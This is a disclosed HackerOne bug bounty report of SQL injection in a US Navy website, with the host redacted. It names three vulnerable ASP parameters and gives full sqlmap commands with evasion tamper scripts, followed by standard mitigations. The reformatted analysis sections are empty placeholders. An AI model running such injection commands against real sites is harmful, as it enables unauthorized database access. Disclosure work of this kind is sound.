# SQL injection found in US Navy Website (http://███/)

## Metadata
- **Source:** HackerOne
- **Report:** 197755 | https://hackerone.com/reports/197755
- **Submitted:** 2017-01-12
- **Reporter:** hassaan
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
**Summary:**

SQL injection found in US Navy Website (http://█████/)

**Description:**

SQL injection found in US Navy website, parameters are:

/display.asp?story_id=98373
/listStories.asp?x=4
/viewVideo.asp?t=6

SQLmap commands:

sqlmap.py -u http://█████/submit/display.asp?story_id=98373 --random-agent --dbms=HSQLDB --level=5 --risk=3 --tamper=between,bluecoat --data="display.asp?story_id=98373

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Summary:**

SQL injection found in US Navy Website (http://█████/)

**Description:**

SQL injection found in US Navy website, parameters are:

/display.asp?story_id=98373
/listStories.asp?x=4
/viewVideo.asp?t=6

SQLmap commands:

sqlmap.py -u http://█████/submit/display.asp?story_id=98373 --random-agent --dbms=HSQLDB --level=5 --risk=3 --tamper=between,bluecoat --data="display.asp?story_id=98373" --time-sec=65 --no-cast -v 3

sqlmap.py -u http://███/listStories.asp?x=4 --random-agent --dbms=HSQLDB --level=5 --risk=3 --tamper=between,bluecoat --data="listStories.asp?x=4" --time-sec=65 --no-cast -v 3

sqlmap.py -u http://██████/viewVideo.asp?t=6 --random-agent --dbms=HSQLDB --level=5 --risk=3 --tamper=between,bluecoat --data="viewVideo.asp?t=6" --time-sec=65 --no-cast -v 3

## Impact

Critical

## Step-by-step Reproduction Instructions

1. Crawling website for vulnerabilities. 
2. Found some parameters having SQL injection.
3. Verified from SQLmap. Screenshots are also attached.

## Product, Version, and Configuration (If applicable)

## Suggested Mitigation/Remediation Actions

Primary Defenses:

Option #1: Use of Prepared Statements (Parameterized Queries)
Option #2: Use of Stored Procedures
Option #3: Escaping all User Supplied Input

Additional Defenses:

Also Enforce: Least Privilege
Also Perform: White List Input Validation

</details>

---
*Analysed by Claude on 2026-05-24*
